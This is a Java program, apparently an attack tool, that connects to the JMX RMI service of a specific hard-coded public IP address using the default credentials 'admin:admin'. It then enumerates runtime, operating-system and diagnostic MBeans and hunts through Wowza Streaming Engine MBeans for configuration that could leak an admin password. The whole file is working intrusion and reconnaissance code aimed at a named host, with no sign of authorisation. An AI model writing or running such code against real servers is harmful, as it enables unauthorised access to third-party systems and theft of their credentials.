import javax.management.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;
public class JmxEnum {
  static final String REAL="160.202.130.243";
  static class RSF extends RMISocketFactory {
    public Socket createSocket(String host,int port) throws IOException {
      if (host==null||host.equals("localhost")||host.equals("127.0.0.1")||host.equals("0.0.0.0")) host=REAL;
      Socket s=new Socket(); s.setSoTimeout(20000); s.connect(new InetSocketAddress(host,port),20000); return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException { return new ServerSocket(port); }
  }
  static MBeanServerConnection mbsc;
  static void dump(ObjectName on) throws Exception {
    System.out.println("\n--- "+on+" ---");
    MBeanInfo info = mbsc.getMBeanInfo(on);
    for (MBeanAttributeInfo a : info.getAttributes()) {
      Object v=null;
      try { v = a.isReadable()? mbsc.getAttribute(on,a.getName()): "[unreadable]"; } catch (Exception e){ v="[err:"+e.getMessage()+"]"; }
      String s = (v==null)?"null":v.toString();
      if (s.length()>300) s=s.substring(0,300)+"...(trunc)";
      System.out.println("  ATTR "+a.getName()+" = "+s);
    }
    for (MBeanOperationInfo o : info.getOperations()) {
      System.out.println("  OP "+o.getReturnType()+" "+o.getName()+"("+Arrays.toString(Arrays.stream(o.getSignature()).map(p->p.getType()).toArray())+")");
    }
  }
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RSF());
    java.rmi.registry.Registry reg=java.rmi.registry.LocateRegistry.getRegistry(REAL,8085);
    RMIServer stub=(RMIServer)reg.lookup("jmxrmi");
    Map<String,Object> env=new HashMap<>();
    env.put(JMXConnector.CREDENTIALS, new String[]{"admin","admin"});
    JMXConnector conn=new RMIConnector(stub,env); conn.connect();
    mbsc=conn.getMBeanServerConnection();
    System.out.println("=== JMX ENUM (admin:admin) ===");
    System.out.println("MBean count: "+mbsc.getMBeanCount());
    System.out.println("Domains: "+Arrays.toString(mbsc.getDomains()));
    // Target MBeans
    String[] targets={
      "java.lang:type=Runtime",
      "java.lang:type=OperatingSystem",
      "java.lang:type=Threading",
      "java.lang:type=Memory",
      "com.sun.management:type=DiagnosticCommand",
      "JMImplementation:type=MBeanServerDelegate",
    };
    for (String t:targets) {
      try { dump(new ObjectName(t)); } catch (Exception e){ System.out.println(t+" -> "+e.getMessage()); }
    }
    // Find Wowza MBeans that could leak config / admin.password
    System.out.println("\n=== WowzaStreamingEngine MBeans (first 80) ===");
    Set<ObjectName> wz = mbsc.queryNames(new ObjectName("WowzaStreamingEngine:*"), null);
    int n=0;
    for (ObjectName on : wz) { n++; if(n<=80) System.out.println("  "+on); }
    System.out.println("  ... total Wowza MBeans: "+n);
    // Dump a few interesting Wowza config MBeans (Server, VHost, Application, Admin)
    for (ObjectName on : wz) {
      String s=on.toString().toLowerCase();
      if (s.contains("server") && !s.contains("stream") && n-->0) {
        try { if (on.toString().matches(".*[Ss]erver(?!Manager).*")) dump(on); } catch (Exception e){}
      }
    }
    conn.close();
  }
}
